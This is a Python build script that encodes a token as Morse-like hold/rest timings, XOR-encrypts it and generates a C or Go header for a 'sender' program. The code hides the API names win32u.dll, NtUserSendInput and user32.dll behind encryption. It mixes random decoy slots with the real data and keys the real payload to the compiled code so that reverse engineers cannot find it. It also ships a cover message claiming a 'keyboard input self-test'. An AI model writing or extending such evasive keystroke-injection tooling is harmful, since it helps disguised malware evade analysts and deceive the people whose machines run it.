#!/usr/bin/env python3
"""Generate the encrypted payload header the sender compiles in.

The timeline is a flat alternating list of holds and rests where every element is
either 1 unit or 3. That is one bit each, so the whole message packs into 18 bytes,
which are then XORed with a keystream. What lands in .rdata is a short run of noise
with no visible structure -- as opposed to the plain duration table, where an
alternating pair of 32-bit values is obvious to anyone who opens a hex viewer.

This is obfuscation and it is not claimed to be anything else: the key is in the
binary, so a reverser who reads the decrypt stub wins. It buys the cost of reading
machine code instead of the cost of scrolling. See notes/design.md.
"""
import argparse
import pathlib
import random
import sys

from layout import NUM_SLOTS, slot_layout
from morse import to_timeline

SEED = 0x9E3779B9
MSG_SEED = 0x1B873593
DLL_SEED = 0x2545F491    # encrypts the literal "win32u.dll" -- see notes/design.md, item 1
PROC_SEED = 0x27D4EB2F   # encrypts the literal "NtUserSendInput"
# Iteration 8: user32 has to be IN the process or win32k rejects every injection, but a
# plaintext "user32.dll" sitting next to the two encrypted names would point straight at
# the emitter and undo iteration 5 item 1. Encrypted for the same reason they are.
CLIENT_SEED = 0x6C078965
DLL_NAME = "win32u.dll"
PROC_NAME = "NtUserSendInput"
CLIENT_NAME = "user32.dll"
MASK = 0xFFFFFFFF


def keystream(count, seed=SEED):
    x = seed
    for _ in range(count):
        x ^= (x << 13) & MASK
        x ^= x >> 17
        x ^= (x << 5) & MASK
        yield (x >> 16) & 0xFF


def pack(token, unit_ms):
    """-> (bits as bytes, element count, the plain durations for verification)."""
    durations = [d for _, d in to_timeline(token, unit_ms)]
    bits = [1 if d != unit_ms else 0 for d in durations]
    packed = bytearray((len(bits) + 7) // 8)
    for i, b in enumerate(bits):
        if b:
            packed[i // 8] |= 0x80 >> (i % 8)
    return bytes(packed), len(bits), durations


def encrypt(blob):
    return bytes(b ^ k for b, k in zip(blob, keystream(len(blob))))


def main(argv=None):
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument("token")
    p.add_argument("--unit", type=int, default=150)
    p.add_argument("--out", default="src/payload.h")
    p.add_argument("--lang", choices=["c", "go"], default="c")
    p.add_argument("--print-durations", action="store_true")
    p.add_argument("--message",
                   default="Keyboard input self-test -- sending diagnostic pattern.")
    args = p.parse_args(argv)

    token = args.token.strip().upper()
    plain, count, durations = pack(token, args.unit)
    blob = encrypt(plain)

    if args.print_durations:
        print(",".join(str(d) for d in durations))
        return 0

    msg = args.message.encode()
    msg_blob = bytes(b ^ k for b, k in zip(msg, keystream(len(msg), MSG_SEED)))
    msg_rows = ["    " + " ".join(f"0x{b:02X}," for b in msg_blob[i:i + 8])
                for i in range(0, len(msg_blob), 8)]

    rows = []
    for i in range(0, len(blob), 8):
        rows.append("    " + " ".join(f"0x{b:02X}," for b in blob[i:i + 8]))
    # The live blob ships as a placeholder. build.sh patches the real one in after
    # linking, encrypted under a key derived from the compiled .text -- so the key
    # exists nowhere in the file and cannot be produced without checksumming the code.
    marker = bytes(range(0xE1, 0xE1 + 8)) + bytes(range(0x5A, 0x5A + 8))
    marker_rows = ["    " + " ".join(f"0x{b:02X}," for b in marker[i:i + 8])
                   for i in range(0, len(marker), 8)]
    placeholder = ["    " + " ".join(f"0x{(0xB7 + i) & 0xFF:02X}," for i in range(len(blob)))]

    if args.lang == "go":
        def gorows(bs, per=8):
            return "\n".join("\t" + " ".join(f"0x{b:02X}," for b in bs[i:i + per])
                              for i in range(0, len(bs), per))

        # Six slots, one transmitted per pass. Two carry the real message (still just
        # a placeholder here -- patch_blob.py fills in the real ciphertext, keyed off
        # the compiled .text, after linking). The other four are permanent random
        # noise decided now and never touched again: nothing about them needs to be
        # reproducible, since a decoy's "plaintext" is never checked against anything.
        # Layout (which slots are real, and every slot's key salt) comes from
        # layout.slot_layout(token) -- patch_blob.py rederives the identical layout
        # from the same token, so there is no metadata file to keep in sync.
        # See notes/design.md, "Iteration 5", item 6.
        real_slots, salts = slot_layout(token)
        # A decoy's plaintext is never checked against anything, so its bytes just need
        # to be reproducible given the same token -- seed off the layout itself.
        rng = random.Random(salts[0])
        slot_blocks = []
        for slot in range(NUM_SLOTS):
            if slot in real_slots:
                # distinguishable-from-each-other but otherwise meaningless placeholder;
                # build.sh overwrites this slot post-link with the real encrypted blob
                placeholder = bytes((0xB7 + slot * 17 + i) & 0xFF for i in range(len(blob)))
                slot_blocks.append(placeholder)
            else:
                slot_blocks.append(bytes(rng.randrange(256) for _ in range(len(blob))))

        dll_bytes = bytes(b ^ k for b, k in
                           zip(DLL_NAME.encode(), keystream(len(DLL_NAME), DLL_SEED)))
        proc_bytes = bytes(b ^ k for b, k in
                            zip(PROC_NAME.encode(), keystream(len(PROC_NAME), PROC_SEED)))
        client_bytes = bytes(b ^ k for b, k in
                             zip(CLIENT_NAME.encode(),
                                 keystream(len(CLIENT_NAME), CLIENT_SEED)))

        pathlib.Path(args.out).write_text(f"""package main

const (
\tpatBits    = {count}
\tpatUnit    = {args.unit}
\tpatBytes   = {len(blob)}
\tpatMarkLen = {len(marker)}
\tnumSlots   = {NUM_SLOTS}
\tmsgSeed    = 0x{MSG_SEED:08X}
\tmsgLen     = {len(msg_blob)}
\tdllSeed    = 0x{DLL_SEED:08X}
\tdllLen     = {len(dll_bytes)}
\tprocSeed   = 0x{PROC_SEED:08X}
\tprocLen    = {len(proc_bytes)}
\tclientSeed = 0x{CLIENT_SEED:08X}
\tclientLen  = {len(client_bytes)}
)

var slotSalt = [numSlots]uint32{{
\t{", ".join(f"0x{s:08X}" for s in salts)},
}}

var patStore = [patMarkLen + numSlots*patBytes]byte{{
{gorows(marker)}
{gorows(b"".join(slot_blocks))}
}}

var msgBlob = [msgLen]byte{{
{gorows(msg_blob)}
}}

var dllBlob = [dllLen]byte{{
{gorows(dll_bytes)}
}}

var procBlob = [procLen]byte{{
{gorows(proc_bytes)}
}}

var clientBlob = [clientLen]byte{{
{gorows(client_bytes)}
}}
""")
        print(f"gen_payload: {args.out} -- {count} elements, {NUM_SLOTS} slots of "
              f"{len(blob)} bytes, real at {real_slots} (go)")
        return 0

    header = f"""/* generated by tools/gen_payload.py -- do not edit by hand */
#ifndef PAYLOAD_H
#define PAYLOAD_H

#define PAT_BITS    {count}
#define PAT_UNIT    {args.unit}
#define PAT_BYTES   {len(blob)}
#define PAT_MARKLEN 16
#define MSG_SEED    0x{MSG_SEED:08X}u
#define MSG_LEN     {len(msg_blob)}

/* marker (16 bytes) followed by the live blob slot -- one array so they stay adjacent */
static const unsigned char PAT_STORE[PAT_MARKLEN + PAT_BYTES] = {{
{chr(10).join(marker_rows)}
{chr(10).join(placeholder)}
}};

static const unsigned char MSG_BLOB[MSG_LEN] = {{
{chr(10).join(msg_rows)}
}};

#endif
"""
    pathlib.Path(args.out).write_text(header)
    print(f"gen_payload: {args.out} -- {count} elements in {len(blob)} bytes")
    return 0


if __name__ == "__main__":
    sys.exit(main())
